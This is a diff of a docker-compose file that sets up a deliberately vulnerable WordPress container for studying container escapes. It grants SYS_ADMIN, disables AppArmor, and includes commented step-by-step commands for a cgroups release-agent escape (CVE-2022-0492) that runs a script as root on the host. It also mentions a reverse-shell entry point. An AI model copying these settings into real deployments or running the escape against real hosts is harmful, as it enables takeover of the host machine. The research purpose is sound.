@@ -1,14 +1,39 @@
-version: '3.8'
+version: '3.3'
 
 # All services needed to run the wordpress service
 services:
   # Container for the wordpress itself
+  #############################################
+  #                                           #    
+  #                 WARNING!                  #
+  #                                           #
+  #        Some configuration commands        #
+  #       are executed after the creation     #
+  #       of the container, so you might      #
+  #       need to wait some minutes before    #
+  #       the server is up and running        #
+  #                                           #
+  #############################################
+
+  
   wordpress:
       container_name: Main_Container
       build: .                                    # This grabs the Dockerfile in the current folder and uses it as the image
       restart: always
       ports: 
           - 8080:80
+
+      # Both cap_add (SYS_ADMIN) and security_opt (apparmor:unconfined)
+      # Were used in order to make it possible for a user to escape
+      # This was implemented on purpose to monitor the SYSCALLs of a
+      # Container escape and should be avoided in real implementations as
+      # much as possible (Explanation at the end of the file)
+      cap_add:
+          - SYS_ADMIN
+
+      security_opt:
+          - apparmor:unconfined
+
       environment:
           WORDPRESS_DB_HOST: db
           WORDPRESS_DB_USER: wpuser
@@ -16,7 +41,7 @@ services:
           WORDPRESS_DB_NAME: wpdb
       volumes:
           - ./uploads.ini:/usr/local/etc/php/conf.d/uploads.ini     # Used to increase the maximum upload file so that it is possible to install plugins
-          - ./wordpress/:/var/www/html/                             # Imports the wordpress files
+          - ./wordpress/:/var/www/html/                             # Imports the wordpress files (Using an already configured server folder to avoid configuration via terminal)
   # Container responsible for the database
   db:
       container_name: db
@@ -29,18 +54,67 @@ services:
           MYSQL_RANDOM_ROOT_PASSWORD: '1'
       volumes:
           - db:/var/lib/mysql
-  # Container responsible for the adminer, (to manipulate the db)
-  adminer:
-      container_name: adminer
-      depends_on:
-          - db
-      image: adminer
-      restart: always
-      ports:
-          - 8888:8080
 
-networks:
-    back:
+
+
 
 volumes:
     db:
+
+
+
+# You can learn about Linux capabilities at:
+# https://manpages.ubuntu.com/manpages/jammy/man7/capabilities.7.html
+#
+# The Docker escape will be made through a cgroups release agent vulnerability
+# (CVE-2022-0492)
+# The requirements for this attack are explained bellow:
+# 
+#
+#
+# Docker runs with the Minimum Privilege Principiple, meaning that each entity should,
+# by default, run with access to the minimum system resources and permissions required
+# to perform its function (https://csrc.nist.gov/glossary/term/least_privilege)
+#
+# To make the escape possible (though it can be achieved in different ways we chose this one)
+# we added the SYS_ADMIN capability to the container, this capability gives us access
+# to multitude of actions, however, the one we're most interested in is mount
+# You can get the detailed information about SYS_ADMIN in the first link provided
+#
+# Still on the topic of capabilities, apparmor (https://ubuntu.com/server/docs/security-apparmor) 
+# on docker, allows among other things, the creation of a restriction list of capabilities
+# in wich SYS_ADMIN is on by default
+# therefore, blocking the SYS_ADMIN capability added previously, in order to circumvent 
+# that, we added the security_opt apparmor:unconfined
+# This option turns of the default docker apparmor profile
+#
+# In order to escape the user within the container needs to be root or have
+# root privileges, for that we used as an entry point a reverse shell 
+# injected through a wordpress plugin vulnerability (CVE-2020–25213) that gave
+# us an initial access to the machine
+#
+# After that we will escalate privilege using a vulnerability in configuration
+# We will assume that, for some reason within the deployment of this machine
+# sudo permisson to execute find was granted to www-data
+# Although this vulnerability is unlikely to be found and easy to explore
+# we decided to add it because in this particular instance of the experiment
+# we are more focused on the container escape rather the privilege escalation
+#
+#   Steps in order to replicate the escape:
+# 
+# mkdir /tmp/cgroup_mount
+# mount -t cgroup -o rmda cgroup /tmp/cgroup_mount/ # Mount the rdma control group on the directory you just created
+# mkdir /tmp/cgroup_mount/test # Create a sub-control group (test)
+# echo 1 > /tmp/cgroup_mount/test/notify_on_release # Enable the notify on release feature
+# dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab) # Path from the host to the container storage
+# echo $dir"/escapingDocker" >  /tmp/cgroup_mount/release_agent # Add our script as the release agent command
+# echo '#!/bin/bash' >> $dir/escapingDocker # Create Script, this will run as root
+# echo 'ps aux > $dir' >> $dir/escapingDocker/output # Create Script
+# echo 'echo "PoC, injected through the container" > /File_on_Host' >> $dir/escapingDocker # Create Script
+# chmod a+x $dir/escapingDocker  # Set the script as executable # Set script as executable
+# sh -c "echo\$$ > /tmp/cgroup_mount/test/cgroup.procs" # Add echo $$ as a proc on the group, because it will terminate immediatly and trigger the notify on release
+# 
+# OPTIONAL:
+# Now check the $dir/escapingDocker/output to see all the process running on the host machine
+# and check the root directory (/) on the host to verify if the file /File_on_Host was created
+#
